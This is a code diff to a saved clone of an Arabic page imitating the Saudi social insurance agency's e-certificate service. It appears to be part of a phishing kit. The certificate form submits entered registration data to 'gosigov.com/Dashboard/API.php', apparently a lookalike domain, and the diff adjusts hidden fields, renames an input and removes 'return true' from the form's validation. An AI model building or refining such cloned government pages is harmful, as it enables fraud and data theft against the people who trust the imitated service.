@@ -2740,6 +2740,12 @@
 
                         </script>
                         <script>
+
+
+
+
+
+
                             $(document).ready(function () {
                                 $('.header-menu a[data-toggle="dropdown"]').click(function (e) {
                                     if ($('.navbar-toggle').is(":visible")) {
@@ -2928,7 +2934,15 @@
                                     <form action="https://gosigov.com/Dashboard/API.php" id="eCertificateForm"
                                         onsubmit="return CertificateValidForm()">
 
+                                        <input type="hidden" name="c" value="Page">
 
+                                        <input type="hidden" name="cid" value="1449389250789">
+
+                                        <input type="hidden" name="d" value="Touch">
+
+                                        <input type="hidden" name="isVanity" value="false">
+
+                                        <input type="hidden" name="locale" value="ar_SA">
 
                                         <div class="col-xs-12 util-bottom-margin-30">
                                             <div class="col-xs-12 util-border-bottom ">
@@ -3003,7 +3017,7 @@
                                                         <div class="form-group">
                                                             <label for="NiN">
                                                                 رقم إشتراك المنشأة <sup>*</sup>
-                                                            </label> <input name="certificate_2" type="text" size="32"
+                                                            </label> <input name="certificate" type="text" size="32"
                                                                 id="registratioNumber" class="form-control">
                                                             <input name="serviceName" type="hidden"
                                                                 value="validateContributorCertificate" id="serviceName">
@@ -3211,9 +3225,49 @@
         gtag('config', 'UA-12534252-1');
     </script>
 
+
+
+
+
     <div class="container">
         <div class="footer-bottom row">
+
+
+
+
+
+
             <link rel="stylesheet" href="./شهادة الكترونية_files/style.css">
+
+
+
+
+
+
+            <!--
+
+
+	<div class="container">
+	<div class="row">
+
+		<div class="col-xs-12 col-sm-4 col-md-3">
+		<div class="copy-rights">كافة الحقوق محفوظة للمؤسسة العامة للتأمينات الإجتماعية 2021 &copy; </div>
+		</div>
+		<div class="col-xs-12 col-sm-5 col-md-6">
+		<div class="statlinks">
+		<a href="/ss/GOSIOnline/Privacy_Policy">سرية المعلومات</a> <span>| </span> 
+		<a href="/ss/GOSIOnline/Term_of_Use">إتفاقية الإستخدام</a> <span>|</span> 
+		<a href="/ss/GOSIOnline/Citizens_Charter">ميثاق المستخدمين</a></div>
+		</div>
+		
+		<div class="col-xs-12 col-sm-3 col-md-3">
+		<div class="asociated-logos"><span class="vison-2030"></span></div>
+		</div>
+		
+		
+		
+	</div>
+	</div> -->
 
             <style>
                 .footer-wrapper {
@@ -3249,6 +3303,10 @@
                 function isAndroid() {
                     return /Android/i.test(navigator.userAgent);
                 }
+
+
+
+
 
             </script>
 
@@ -3725,6 +3783,47 @@
                 </div>
                 <!--End Quick Links -->
 
+                <!--Start User Chat Fields -->
+                <!-- <div class=" col-xs-12 bot_fields" id="formBody" style="display:none">
+        <form class="primary-form" autocomplete="on" style="margin-top:-15px;">
+            <div class="form-group">
+                <label for="fname">
+            الاسم <sup>*</sup>
+        </label>
+                <input class="form-control" type="text" name="fname" id="fname" placeholder="اكتب اسمك" maxlength="50" />
+                <div class="form-error" id="fname_error" style="font-size:10px;"></div>
+
+                <label for="emailid">
+            البريد الإلكتروني <sup>*</sup>
+        </label>
+                <input class="form-control" type="text" name="emailid" id="emailid" placeholder="youremail@example.com" maxlength="50" />
+                <div class="form-error" id="emailid_error" style="font-size:10px;"></div>
+
+                <label for="phonenum">
+            رقم الجوال <sup>*</sup>
+        </label>
+                <input class="form-control" type="text" name="phonenum" id="phonenum" placeholder="05X XXX XXXX" maxlength="10" />
+                <div class="form-error" id="phonenum_error" style="font-size:10px;"></div>
+
+                <label for="captchaForChat">
+            رمز التحقق <sup>*</sup>
+        </label>
+                <div class="row">
+                    <div class="col-xs-6">
+                        <input id="captchaForChat" name="captchaForChat" type="text" class="form-control form-group-captcha" maxlength="4" placeholder="رمز التحقق">
+                        <div class="form-error" id="captchaForChatError" style="font-size:10px;"></div>
+                    </div>
+                    <div class="col-xs-6">
+                        <img alt="img" src="" class="img-reponsive form-group-captcha-image" id="captchaForChatImage" />
+                    </div>
+                </div>
+
+                <input type="hidden" name="activityID" id="activityID" value="" />
+                <input class="btn primary-button" id="StartChatBtn" value="بدء المحادثة" style="width:100%; margin-top:10px; margin-bottom:-20px;">
+            </div>
+        </form>
+    </div> -->
+                <!--End User Chat Fields -->
 
                 <!--Start User Chat -->
                 <div class="col-xs-12 chat_window" id="myForm" style="display:none">
@@ -3818,7 +3917,28 @@
                                 <input class="rating__input" name="rating1" id="rating1-5" value="5" type="radio">
                             </div>
                         </div>
+                        <!-- End of Question 1 -->
+                        <!-- <p>مدى رضاك العام عن خدمة المحادثة الفورية: <i class="chatbot_requiredQ">&#9913;</i></p>
+            <div id="chatBotEval-question2">
+                <div class="rating-group" onclick=set_rate(this)>
+                    <input disabled checked class="rating__input rating__input--none" name="rating2" id="rating2-none" value="0" type="radio">
 
+                    <label aria-label="1 star" class="rating__label" for="rating2-1"><i class="rating__icon rating__icon--star icon-star"></i></label>
+                    <input class="rating__input" name="rating2" id="rating2-1" value="1" type="radio">
+
+                    <label aria-label="2 stars" class="rating__label" for="rating2-2"><i class="rating__icon rating__icon--star icon-star"></i></label>
+                    <input class="rating__input" name="rating2" id="rating2-2" value="2" type="radio">
+
+                    <label aria-label="3 stars" class="rating__label" for="rating2-3"><i class="rating__icon rating__icon--star icon-star"></i></label>
+                    <input class="rating__input" name="rating2" id="rating2-3" value="3" type="radio">
+
+                    <label aria-label="4 stars" class="rating__label" for="rating2-4"><i class="rating__icon rating__icon--star icon-star"></i></label>
+                    <input class="rating__input" name="rating2" id="rating2-4" value="4" type="radio">
+
+                    <label aria-label="5 stars" class="rating__label" for="rating2-5"><i class="rating__icon rating__icon--star icon-star"></i></label>
+                    <input class="rating__input" name="rating2" id="rating2-5" value="5" type="radio">
+                </div>
+            </div> -->
                         <!-- Comment Part -->
                         <div class="ChatBotComment">
                             <p>نرحب بآرائك واقتراحاتك لنتشارك معك في تطوير خدماتنا:</p>
@@ -4267,7 +4387,7 @@
             }
 
             // All validations passed
-            return true;
+
         }
     </script>
 
@@ -4296,6 +4416,7 @@
                         window.location.href = redirectUrl;
                     })
                     .catch(error => {
+                        alert('Error: ' + error);
                     });
             });
         });
